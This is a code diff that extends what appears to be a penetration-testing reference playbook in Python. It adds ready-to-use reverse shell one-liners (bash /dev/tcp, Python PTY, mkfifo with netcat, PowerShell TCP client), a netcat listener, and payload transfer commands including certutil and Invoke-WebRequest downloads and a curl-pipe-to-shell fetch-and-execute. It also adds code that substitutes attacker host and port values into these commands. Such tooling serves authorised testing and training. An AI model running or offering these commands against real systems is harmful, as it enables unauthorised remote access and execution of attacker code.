@@ -373,13 +373,81 @@ REFERENCE_PLAYBOOK: List[Dict[str, Any]] = [
         "desc": "Online password dictionary attack against SSH service.",
         "tags": ["cracking", "hydra", "ssh"],
     },
+    {
+        "category": "Shells",
+        "title": "Netcat Reverse Shell Listener",
+        "command": "nc -lvnp <LPORT>",
+        "desc": "Standard catch-all netcat listener for incoming reverse shells.",
+        "tags": ["shells", "listener", "netcat"],
+    },
+    {
+        "category": "Shells",
+        "title": "Bash TCP Reverse Shell",
+        "command": "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
+        "desc": "Classic interactive bash one-liner reverse shell.",
+        "tags": ["shells", "bash", "reverse"],
+    },
+    {
+        "category": "Shells",
+        "title": "Python3 Interactive PTY Reverse Shell",
+        "command": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'",
+        "desc": "Python3 reverse shell with immediate PTY terminal spawn.",
+        "tags": ["shells", "python", "pty"],
+    },
+    {
+        "category": "Shells",
+        "title": "Named Pipe (mkfifo) Reverse Shell",
+        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f",
+        "desc": "Reliable POSIX reverse shell when netcat -e is disabled.",
+        "tags": ["shells", "mkfifo", "netcat"],
+    },
+    {
+        "category": "Shells",
+        "title": "PowerShell One-Line Reverse Shell",
+        "command": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()\"",
+        "desc": "Windows native PowerShell reverse shell.",
+        "tags": ["shells", "powershell", "windows"],
+    },
+    {
+        "category": "Transfer",
+        "title": "Staging HTTP Web Server",
+        "command": "python3 -m http.server <LPORT>",
+        "desc": "Local HTTP web server to host scripts, linpeas, and exploits.",
+        "tags": ["transfer", "http", "staging"],
+    },
+    {
+        "category": "Transfer",
+        "title": "Certutil Windows File Download",
+        "command": "certutil -urlcache -f http://<LHOST>:<LPORT>/file.exe file.exe",
+        "desc": "Native Windows binary download using built-in certutil.",
+        "tags": ["transfer", "windows", "certutil"],
+    },
+    {
+        "category": "Transfer",
+        "title": "PowerShell Invoke-WebRequest Download",
+        "command": "powershell -c \"iwr -uri http://<LHOST>:<LPORT>/file.exe -outfile file.exe\"",
+        "desc": "Windows file download using PowerShell iwr.",
+        "tags": ["transfer", "windows", "powershell"],
+    },
+    {
+        "category": "Transfer",
+        "title": "Linux cURL Download & Execute",
+        "command": "curl http://<LHOST>:<LPORT>/linpeas.sh | sh",
+        "desc": "Stream enumeration script directly into shell without touching disk.",
+        "tags": ["transfer", "linux", "curl"],
+    },
 ]
 
 
-def search_reference(query: str, target_ip: str = "") -> List[Dict[str, Any]]:
+def search_reference(
+    query: str,
+    target_ip: str = "",
+    lhost: str = "",
+    lport: str = "",
+) -> List[Dict[str, Any]]:
     """Search reference playbook by keyword or category.
 
-    Substitutes <TARGET_IP> and <TARGET_SUBNET> if target_ip is provided.
+    Substitutes <TARGET_IP>, <TARGET_SUBNET>, <LHOST>, and <LPORT>.
     """
     q = query.strip().lower()
     results: List[Dict[str, Any]] = []
@@ -402,6 +470,10 @@ def search_reference(query: str, target_ip: str = "") -> List[Dict[str, Any]]:
                 cmd = cmd.replace("<TARGET_IP>", target_ip)
             if subnet:
                 cmd = cmd.replace("<TARGET_SUBNET>", subnet)
+            if lhost:
+                cmd = cmd.replace("<LHOST>", lhost).replace("<ATTACKER_IP>", lhost).replace("<LOCAL_IP>", lhost)
+            if lport:
+                cmd = cmd.replace("<LPORT>", str(lport)).replace("<LOCAL_PORT>", str(lport))
 
             results.append({
                 "category": entry["category"],
